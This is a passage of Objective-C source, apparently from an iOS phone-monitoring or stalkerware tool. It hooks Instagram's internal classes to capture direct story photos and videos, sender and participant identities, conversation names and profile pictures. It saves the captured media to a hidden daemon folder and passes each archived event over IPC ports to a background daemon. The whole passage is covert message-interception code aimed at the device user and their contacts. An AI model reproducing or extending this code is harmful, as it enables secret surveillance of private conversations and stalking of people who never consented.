        DLog(@"realTimeService %@", realTimeService);
        IGDirectStoryService *directStoryService = realTimeService.directStoryService;
        
        IGDirectStory *aStory = [directStoryService storyForId:aStoryID];
        
        DLog(@"Captured Message %@", anAsset);
        DLog(@"inThread %@", aStory);
        
        NSMutableDictionary *IGDictionary = [NSMutableDictionary dictionary];
        
        __block FxEventDirection messgageDirection;
        __block FxIMMessageRepresentation messageRepresentation = kIMMessageNone;
        NSString *message = nil;
        
        IGUser *currentUser = currentUserSession.user;
        
        IGUser *sender = currentUser;
            //DLog(@"pageID %@", sender.pageID);
        DLog(@"pk %@", sender.pk);
        DLog(@"username %@", sender.username);
        
        if ([sender.pk isEqualToString:currentUser.pk]) {
            messgageDirection = kEventDirectionOut;
        }
        else {
            messgageDirection = kEventDirectionIn;
        }
        
            // -- get UID ------------------------------------------------------------
        NSString *senderUID             = [NSString stringWithString:sender.pk];             // -- Target    - UID
        
            // -- get Display Name  ------------------------------------------------------------
        NSString *senderDisplayName     = [NSString stringWithString:sender.username];     // -- Target    - Display Name
        
            // -- get ShortDisplay Name  ------------------------------------------------------------
            //NSString *senderShortDisplayName     = [NSString stringWithString:sender.displayName];     // -- Target    - Display Name
        
            // -- get Text ------------------------------------------------------------
            //NSString *textMessage           = [NSString stringWithString:anItem.message];                                         // -- Message Text
            //DLog(@"-- Text message:   %@", textMessage);
        
            // -- get conversation ID  ------------------------------------------------------------
        NSString *converID              = @"";       // -- Conversation ID
        if (aStory.storyId.length > 0) {
            converID = [NSString stringWithString:aStory.storyId];
        }
        
        DLog(@"converID %@", converID);
        
        NSString *converName             = @"";       // -- Conversation ID
        
        if (aStory.threadName.length > 0) {
            converName = [NSString stringWithString:aStory.threadName];
        }
        else if ([[aStory threadDisplayName] length] > 0){
            converName = [NSString stringWithString:[aStory threadDisplayName]];
        }
        
        DLog(@"converName %@", converName)
        
        NSMutableArray *participants    = [NSMutableArray array];
        NSMutableDictionary *participantProfileDictionary = [NSMutableDictionary dictionary];
        
        NSArray *allUserInthread = aStory.users;
        DLog(@"all user in thread %@", allUserInthread);
        [allUserInthread enumerateObjectsUsingBlock:^(IGUser *user, NSUInteger idx, BOOL * _Nonnull stop) {
            @try {
                    //Filter out sender
                if (![user.pk isEqualToString:sender.pk]) {
                    FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:user.pk]
                                                                          displayname: user.username
                                                                        statusMessage: @""
                                                                       pictureProfile:nil];
                    [participants addObject:participant];
                    [participantProfileDictionary setObject:[user.profilePicURL absoluteString] forKey:user.pk];
                }
            } @catch (NSException *exception) {
                DLog(@"Found exception %@", exception);
            } @finally {
                    //Done
            }
        }];
        
        if (messgageDirection == kEventDirectionIn) {
            Class $IGAuthHelper = objc_getClass("IGAuthHelper");
            IGAuthHelper *authHelper = [$IGAuthHelper sharedAuthHelper];
            IGUserSession *currentUserSession = authHelper.currentUserSession;
            IGUser *currentUser = currentUserSession.user;
            DLog(@"currentUser %@", currentUser);
            
            FxRecipient *participant = [IGUtils createFxRecipientWithUsername:[NSString stringWithString:currentUser.pk]
                                                                  displayname: currentUser.username
                                                                statusMessage: @""
                                                               pictureProfile:nil];
            
            [participants insertObject:participant atIndex:0];
            [participantProfileDictionary setObject:[currentUser.profilePicURL absoluteString] forKey:currentUser.pk];
        }
        
        [IGDictionary setObject:participantProfileDictionary forKey:@"ParticipantProfileDic"];
        
        
        NSMutableArray *attachmentArray = [NSMutableArray array];
        
            //Profile Picture Data
        if ([sender.profilePicURL absoluteString].length > 0) {
            [IGDictionary setObject:[NSString stringWithString:[sender.profilePicURL absoluteString]] forKey:@"ProfilePictureURL"];
        }
        
        //Photo
        Class $IGQuickCamOutputPhotoAsset = objc_getClass("IGQuickCamOutputPhotoAsset");
        if ([anAsset isKindOfClass:[$IGQuickCamOutputPhotoAsset class]]) {
            UIImage *fullSizeImageWithEdits = [anAsset fullSizeImageWithEdits];
            [IGDictionary setObject:fullSizeImageWithEdits forKey:@"AttachmentImage"];
            [IGDictionary setObject:@".jpg" forKey:@"AttachmentExtension"];
            
        }
        
        Class $IGQuickCamOutputVideoAsset = objc_getClass("IGQuickCamOutputVideoAsset");
        if ([anAsset isKindOfClass:[$IGQuickCamOutputVideoAsset class]]) {
            [IGDictionary setObject:[anAsset videoData] forKey:@"AttachmentVideoData"];
            [IGDictionary setObject:@".mp4" forKey:@"AttachmentExtension"];
            
            UIImage *displayImageWithEdits = [anAsset displayImageWithEdits];
            [IGDictionary setObject:displayImageWithEdits forKey:@"AttachmentVideoImage"];
        }
        
        DLog(@"IG Dictionary %@", IGDictionary);
        
            // ------------------- FXIMEvent Construction ------------------------
        
        FxIMEvent *imEvent      = [IGUtils createFXIMEventForMessageDirection: messgageDirection
                                                               representation: messageRepresentation
                                                                      message: message
                                                                       userID: senderUID                 // sender id
                                                              userDisplayName: senderDisplayName         // sender display name
                                                            userStatusMessage: @""       // sender status message
                                                                  userPicture: nil
                                                                     converID: converID
                                                                   converName: converName
                                                                converPicture: nil
                                                                 participants: participants
                                                                  attachments: attachmentArray];
        [[IGUtils sharedIGUtils] sendIGEvent:imEvent withIGDictionary:IGDictionary];
    }
    @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    }
    @finally {
        ;
    }
}


#pragma mark - Create FXEvent before sending to server

+ (FxIMEvent *) createFXIMEventForMessageDirection: (FxEventDirection) aDirection
                                    representation: (FxIMMessageRepresentation) aRepresentation
                                           message: (NSString *) aMessage
                                            userID: (NSString *) aUserID
                                   userDisplayName: (NSString *) aUserDisplayname
                                 userStatusMessage: (NSString *) aUserStatusMessage
                                       userPicture: (NSData *) aUserPic
                                          converID: (NSString *) aConverID
                                        converName: (NSString *) aConverName
                                     converPicture: (NSData *) aConverPic
                                      participants: (NSArray *) aParticipaints
                                       attachments: (NSArray *) aAttachments {
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:@"ig"];
    [imEvent setMServiceID: kIMServiceInstagram];
    
    
    [imEvent setMDirection: aDirection];
    [imEvent setMRepresentationOfMessage: aRepresentation];
    [imEvent setMMessage: aMessage];
    
    // user (sender)
    [imEvent setMUserID: aUserID];
    [imEvent setMUserDisplayName: aUserDisplayname];
    [imEvent setMUserStatusMessage: aUserStatusMessage];
    [imEvent setMUserPicture: aUserPic];// sender image profile
    [imEvent setMUserLocation: nil];
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aConverName];
    [imEvent setMConversationPicture:aConverPic];
    
    // participant
    [imEvent setMParticipants:aParticipaints];
    
    // share location
    [imEvent setMShareLocation:nil];
    
    [imEvent setMAttachments:aAttachments];
    DLog(@"Instagram Direct Message  %@", imEvent);
    
    return [imEvent autorelease];
}

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname
                                  statusMessage: (NSString *) aStatusMessage
                                 pictureProfile: (NSData *) aPictureProfile {
    FxRecipient *participant = [[FxRecipient alloc] init];
    [participant setRecipNumAddr:aUserID];
    [participant setRecipContactName:aUserDisplayname];
    [participant setMStatusMessage:aStatusMessage];
    [participant setMPicture:aPictureProfile];
    return [participant autorelease];
}

#pragma mark - Send event thread method -

- (void) sendIGEvent: (FxIMEvent *) aIMEvent withIGDictionary:(NSDictionary *)anIGDictionary;
{
    //DLog(@"Sending Event");
    NSArray *extraArgs  = [[NSArray alloc] initWithObjects:aIMEvent, anIGDictionary, nil];
    [NSThread detachNewThreadSelector:@selector(threadSendIGEvent:) toTarget:self withObject:extraArgs];
    
    [extraArgs release];
}

- (void) threadSendIGEvent: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        NSDictionary *IGDictionary = [aArgs objectAtIndex:1];
        
        //Download Profile Picture Data
        NSString *profilePictureURL = IGDictionary[@"ProfilePictureURL"];
        if (profilePictureURL.length > 0) {
            NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
            [imEvent setMUserPicture:profilePictureData];
            DLog(@"Download Profile Picture Data %@", profilePictureURL);
        }
        
        //Download Participant Profile Picture Data
        NSArray *participantArray = imEvent.mParticipants;
        NSDictionary *profileDic = IGDictionary[@"ParticipantProfileDic"];
        [participantArray enumerateObjectsUsingBlock:^(FxRecipient *participant, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            
            if ([profileDic objectForKey:participant.recipNumAddr]) {
                NSString *profilePictureURL = [profileDic objectForKey:participant.recipNumAddr];
                
                if (profilePictureURL.length > 0) {
                    DLog(@"Download Participant Profile Picture Data %@", profilePictureURL);
                    NSData *profilePictureData = [NSData dataWithContentsOfURL:[NSURL URLWithString:profilePictureURL]];
                    [participant setMPicture:profilePictureData];
                }
            }
        }];
        
        NSString *attachmentURL = IGDictionary[@"AttachmentURL"];
        NSString *thumbnailURL = IGDictionary[@"thumbnailURL"];
        //For outgoing direct story
        UIImage *attachmentImage = IGDictionary[@"AttachmentImage"];
        NSString *attachmentExtension = IGDictionary[@"AttachmentExtension"];
        
        NSData *attachmentVideoData = IGDictionary[@"AttachmentVideoData"];
        
        if (attachmentURL.length > 0) {
            FxAttachment *attachment = [[FxAttachment alloc] init];
            NSString *IGAttachmentPath = nil;
            NSMutableArray *attachmentArray = [NSMutableArray array];
            NSData *mediaData = [NSData dataWithContentsOfURL:[NSURL URLWithString:attachmentURL]];
            //DLog(@"Media URL %@", originalUrl);
            if (mediaData) {
                IGAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imInstagram/"];
                DLog(@"lastPathComponent %@ ", attachmentURL.lastPathComponent);
                if ([attachmentURL.lastPathComponent isEqualToString:@".png"] || [attachmentURL.lastPathComponent isEqualToString:@".mp4"]) {
                    IGAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", IGAttachmentPath, [[NSDate date] timeIntervalSince1970], attachmentURL.lastPathComponent];
                }
                else {
                    IGAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", IGAttachmentPath, [[NSDate date] timeIntervalSince1970], attachmentExtension];
                }
                
                
                if (![mediaData writeToFile:IGAttachmentPath atomically:YES]) {
                    // iOS 9, Sandbox
                    IGAttachmentPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imInstagram/" fileName:[IGAttachmentPath lastPathComponent]];
                }
            } else {
                IGAttachmentPath = @"image/jpg";
            }
            
            [attachment setFullPath:IGAttachmentPath];
            
            if (thumbnailURL.length > 0) {
                NSData *thumbnailData = [NSData dataWithContentsOfURL:[NSURL URLWithString:thumbnailURL]];
                [attachment setMThumbnail:thumbnailData];
            }
            else {
                [attachment setMThumbnail:nil];
            }
            
            [attachmentArray addObject:attachment];
            [attachment release];
            
            [imEvent setMAttachments:attachmentArray];
        }
        
        if (attachmentImage) {
            FxAttachment *attachment = [[FxAttachment alloc] init];
            NSString *IGAttachmentPath = nil;
            NSMutableArray *attachmentArray = [NSMutableArray array];
           
            IGAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imInstagram/"];
            IGAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", IGAttachmentPath, [[NSDate date] timeIntervalSince1970], attachmentExtension];
           
            //Correcting image orientation
            UIImage *rotatedImage = [IGUtils rotateUIImage:attachmentImage];
            NSData *attachmentData = UIImageJPEGRepresentation(rotatedImage, 1.0);
            
            if (![attachmentData writeToFile:IGAttachmentPath atomically:YES]) {
                    // iOS 9, Sandbox
                IGAttachmentPath = [IMShareUtils saveData:attachmentData toDocumentSubDirectory:@"/attachments/imInstagram/" fileName:[IGAttachmentPath lastPathComponent]];
            }
            
            [attachment setFullPath:IGAttachmentPath];
            
            [attachmentArray addObject:attachment];
            [attachment release];
            
            [imEvent setMAttachments:attachmentArray];
        }
        
        if (attachmentVideoData) {
            FxAttachment *attachment = [[FxAttachment alloc] init];
            NSString *IGAttachmentPath = nil;
            NSMutableArray *attachmentArray = [NSMutableArray array];
            
            IGAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imInstagram/"];
            IGAttachmentPath = [NSString stringWithFormat:@"%@%f_%@", IGAttachmentPath, [[NSDate date] timeIntervalSince1970], attachmentExtension];
            
            if (![attachmentVideoData writeToFile:IGAttachmentPath atomically:YES]) {
                    // iOS 9, Sandbox
                IGAttachmentPath = [IMShareUtils saveData:attachmentVideoData toDocumentSubDirectory:@"/attachments/imInstagram/" fileName:[IGAttachmentPath lastPathComponent]];
            }
            
            [attachment setFullPath:IGAttachmentPath];
            
            UIImage *thumbnailImage = IGDictionary[@"AttachmentVideoImage"];
            if (thumbnailImage) {
                NSData *thumbnailData = UIImageJPEGRepresentation(thumbnailImage, 1.0);
                [attachment setMThumbnail:thumbnailData];
            }
            else {
                [attachment setMThumbnail:nil];
            }
            
            [attachmentArray addObject:attachment];
            [attachment release];
            
            [imEvent setMAttachments:attachmentArray];
        }

        if (imEvent) {
            DLog(@"Sending Event %@", imEvent);
            NSString *msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
            DLog(@"Instagram direct message after remove emoji = %@", msg);
            
            if ([msg length] || [[imEvent mAttachments] count]) {
                [imEvent setMMessage:msg];
                
                NSMutableData* data			= [[NSMutableData alloc] init];
                NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
                [archiver encodeObject:imEvent forKey:kInstagramArchived];
                [archiver finishEncoding];
                [archiver release];
                
                // -- first
                BOOL isSendingOK = [self sendDataToPort:data portName:kInstagramMessagePort1];
                //DLog (@"Sending to first port %d", isSendingOK);
                
                if (!isSendingOK) {
                    DLog (@"First sending Instagram direct message fail");
                    
                    // -- second
                    isSendingOK = [self sendDataToPort:data portName:kInstagramMessagePort2];
                    
                    if (!isSendingOK) {
                        DLog (@"Second sending Instagram direct message also fail");
                        
                        // -- Third port ----------
                        [NSThread sleepForTimeInterval:3];
                        
                        isSendingOK = [self sendDataToPort:data portName:kInstagramMessagePort3];
                        if (!isSendingOK) {
                            DLog (@"Third sending Instagram direct message also fail, so delete the attachment");
                            [IGUtils deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
                        }
                    }
                }
                [data release];
            }
        } // aIMEvent
    }
    @catch (NSException *exception){
        DLog(@"Found Exception %@", exception);
    }
    @finally {
        ;
    }
    [pool release];
}

- (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
    BOOL successfully = FALSE;
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
        MessagePortIPCSender *messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
        successfully                            = [messagePortSender writeDataToPort:aData];
        [messagePortSender release];
        messagePortSender = nil;
    } else {
        SharedFile2IPCSender *sharedFileSender  = self.mIMSharedFileSender;
        DLog(@"sharedFileSender %@", sharedFileSender)
        successfully = [sharedFileSender writeDataToSharedFile:aData];
    }
    return (successfully);
}


#pragma mark - General Utils -

- (void)initialize
{
    [_IGUtils registerForAppDidBecomeActive];
    [_IGUtils restoreLastestThreadTimeStampDic];
}

- (void) storeLastestThreadTimeStamp: (long long)aLastestTimeStamp forThreadID:(NSString *)aThreadID
{
    if (aLastestTimeStamp && aThreadID) {
        [self.mLastestThreadTimestampDic setObject:[NSNumber numberWithLongLong:aLastestTimeStamp] forKey:aThreadID];
        
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *basePath = paths.firstObject;
        NSString *filePath = [basePath stringByAppendingString:@"/lastestTimestamp.plist"];
        [self.mLastestThreadTimestampDic writeToFile:filePath atomically:YES];
    }
}

- (void) restoreLastestThreadTimeStampDic {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *basePath = paths.firstObject;
    NSString *filePath = [basePath stringByAppendingString:@"/lastestTimestamp.plist"];
    NSDictionary *lastestTimeStampInfo = [NSDictionary dictionaryWithContentsOfFile:filePath];
    if (lastestTimeStampInfo) {
        self.mLastestThreadTimestampDic = [NSMutableDictionary dictionaryWithDictionary:lastestTimeStampInfo];
    } else {
        self.mLastestThreadTimestampDic = [NSMutableDictionary dictionary];
    }
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray {
    // delete the attachment files
    if (aAttachmentArray && [aAttachmentArray count] != 0) {
        for (FxAttachment *attachment in aAttachmentArray) {
            NSString *path = [attachment fullPath];
            //DLog (@"deleting Instagram attachment file: %@", path);
            [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
        }
    }
}

+ (UIImage*)rotateUIImage:(UIImage*)src {
    
        // No-op if the orientation is already correct
    if (src.imageOrientation == UIImageOrientationUp) return src ;
    
        // We need to calculate the proper transformation to make the image upright.
        // We do it in 2 steps: Rotate if Left/Right/Down, and then flip if Mirrored.
    CGAffineTransform transform = CGAffineTransformIdentity;
    
    switch (src.imageOrientation) {
        case UIImageOrientationDown:
        case UIImageOrientationDownMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.width, src.size.height);
            transform = CGAffineTransformRotate(transform, M_PI);
            break;
            
        case UIImageOrientationLeft:
        case UIImageOrientationLeftMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.width, 0);
            transform = CGAffineTransformRotate(transform, M_PI_2);
            break;
            
        case UIImageOrientationRight:
        case UIImageOrientationRightMirrored:
            transform = CGAffineTransformTranslate(transform, 0, src.size.height);
            transform = CGAffineTransformRotate(transform, -M_PI_2);
            break;
        case UIImageOrientationUp:
        case UIImageOrientationUpMirrored:
            break;
    }
    
    switch (src.imageOrientation) {
        case UIImageOrientationUpMirrored:
        case UIImageOrientationDownMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.width, 0);
            transform = CGAffineTransformScale(transform, -1, 1);
            break;
            
        case UIImageOrientationLeftMirrored:
        case UIImageOrientationRightMirrored:
            transform = CGAffineTransformTranslate(transform, src.size.height, 0);
            transform = CGAffineTransformScale(transform, -1, 1);
            break;
        case UIImageOrientationUp:
        case UIImageOrientationDown:
        case UIImageOrientationLeft:
        case UIImageOrientationRight:
            break;
    }
    
        // Now we draw the underlying CGImage into a new context, applying the transform
        // calculated above.
    CGContextRef ctx = CGBitmapContextCreate(NULL, src.size.width, src.size.height,
                                             CGImageGetBitsPerComponent(src.CGImage), 0,
                                             CGImageGetColorSpace(src.CGImage),
                                             CGImageGetBitmapInfo(src.CGImage));
    CGContextConcatCTM(ctx, transform);
    switch (src.imageOrientation) {
        case UIImageOrientationLeft:
        case UIImageOrientationLeftMirrored:
        case UIImageOrientationRight:
        case UIImageOrientationRightMirrored:
                // Grr...
            CGContextDrawImage(ctx, CGRectMake(0,0,src.size.height,src.size.width), src.CGImage);
            break;
            
        default:
            CGContextDrawImage(ctx, CGRectMake(0,0,src.size.width,src.size.height), src.CGImage);
            break;
    }
    
        // And now we just create a new UIImage from the drawing context
    CGImageRef cgimg = CGBitmapContextCreateImage(ctx);
    UIImage *img = [UIImage imageWithCGImage:cgimg];
    CGContextRelease(ctx);
    CGImageRelease(cgimg);
    return img;
}

#pragma mark - Dealloc - 

- (void)dealloc
{
    [self unregisterForAppDidBecomeActive];
    
    [self.mLastestThreadTimestampDic release];
    self.mLastestThreadTimestampDic = nil;
    
    [self.mIMSharedFileSender release];
    self.mIMSharedFileSender = nil;
    
    [super dealloc];
}

@end
